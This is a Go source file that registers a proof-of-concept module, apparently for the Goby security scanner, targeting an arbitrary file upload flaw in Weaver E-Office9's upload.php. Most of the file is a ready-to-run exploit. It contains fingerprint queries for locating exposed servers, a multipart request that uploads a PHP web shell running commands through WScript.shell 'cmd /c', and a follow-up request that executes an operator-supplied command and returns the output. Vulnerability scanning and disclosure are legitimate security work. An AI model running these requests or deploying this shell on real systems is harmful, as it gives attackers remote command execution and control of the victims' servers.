package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Weaver E-Office9  upload.php file upload vulnerability",
    "Description": "<p>Weaver E-Office9 is an online office system of Shanghai Weaver Network Technology Co., Ltd.</p><p>The latest version of Weaver E-Office9 v20220525 has an arbitrary file upload vulnerability in the /webservice/upload/upload.php file, through which an attacker can gain control rights of the server.</p>",
    "Product": "Weaver-EOffice",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2022-08-04",
    "Author": "qiushui_sir@163.com",
    "FofaQuery": " ((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\" ",
    "GobyQuery": " ((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\" ",
    "Level": "3",
    "Impact": "<p>The latest version of Weaver E-Office9 v20220525 has an arbitrary file upload vulnerability in the /webservice/upload/upload.php file, through which an attacker can gain control rights of the server.</p>",
    "Recommendation": "<p>1. The manufacturer has not fixed this vulnerability yet, please contact the manufacturer to fix it</p><p>2. Deploy a web application firewall to monitor file operations</p><p>3. If it is not necessary, it is forbidden to access the system from the public network</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/webservice/upload/upload.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarypT3Bbj7EGhdhhZH0"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundarypT3Bbj7EGhdhhZH0\nContent-Disposition: form-data; name=\"file\"; filename=\"eoffice9_upload.php.\"\nContent-Type: png\n\n<?php echo md5(123);?>\n------WebKitFormBoundarypT3Bbj7EGhdhhZH0--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "eoffice9_upload",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "dir|lastbody|regex|(.*?)\\*"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/attachment/{{{dir}}}/eoffice9_upload.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b70",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/webservice/upload/upload.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarypT3Bbj7EGhdhhZH0"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundarypT3Bbj7EGhdhhZH0\nContent-Disposition: form-data; name=\"file\"; filename=\"eoffice9_upload.php.\"\nContent-Type: png\n\n<?php\n$command=$_REQUEST['img'];\n$wsh = new COM('WScript.shell');\n$exec = $wsh->exec(\"cmd /c\".$command);\n$stdout = $exec->StdOut();\n$stroutput = $stdout->ReadAll();\necho $stroutput;\n?>\n------WebKitFormBoundarypT3Bbj7EGhdhhZH0--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "eoffice9_upload",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "dir1|lastbody|regex|(.*?)\\*"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/attachment/{{{dir1}}}/eoffice9_upload.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "img={{{cmd}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "OR",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b70",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\w\\W]+)"
            ]
        }
    ],
    "Tags": [
        "File Upload",
        "Information technology application innovation industry"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "泛微E-Office9 upload.php文件上传漏洞",
            "Product": "泛微-EOffice",
            "Description": "<p>泛微E-Office9是上海泛微网络科技股份有限公司的一套在线办公系统。</p><p>泛微E-Office9的最新版本v20220525的/webservice/upload/upload.php文件存在任意文件上传漏洞，攻击者可通该漏洞获取服务器的控制权限。</p>",
            "Recommendation": "<p>1、厂商暂未修复此漏洞， 请联系厂商进行修复</p><p>2、部署web应用防火墙，对文件操作操作进行监控</p><p>3、如非必要，禁止公网访问此系统</p>",
            "Impact": "<p>泛微E-Office9的最新版本v20220525的/webservice/upload/upload.php文件存在任意文件上传漏洞，攻击者可通该漏洞获取服务器的控制权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传",
                "信创"
            ]
        },
        "EN": {
            "Name": "Weaver E-Office9  upload.php file upload vulnerability",
            "Product": "Weaver-EOffice",
            "Description": "<p>Weaver E-Office9 is an online office system of Shanghai Weaver Network Technology Co., Ltd.</p><p>The latest version of Weaver E-Office9 v20220525 has an arbitrary file upload vulnerability in the /webservice/upload/upload.php file, through which an attacker can gain control rights of the server.</p>",
            "Recommendation": "<p>1. The manufacturer has not fixed this vulnerability yet, please contact the manufacturer to fix it</p><p>2. Deploy a web application firewall to monitor file operations</p><p>3. If it is not necessary, it is forbidden to access the system from the public network</p>",
            "Impact": "<p>The latest version of Weaver E-Office9 v20220525 has an arbitrary file upload vulnerability in the /webservice/upload/upload.php file, through which an attacker can gain control rights of the server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload",
                "Information technology application innovation industry"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-07-22",
    "PocId": "10967"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
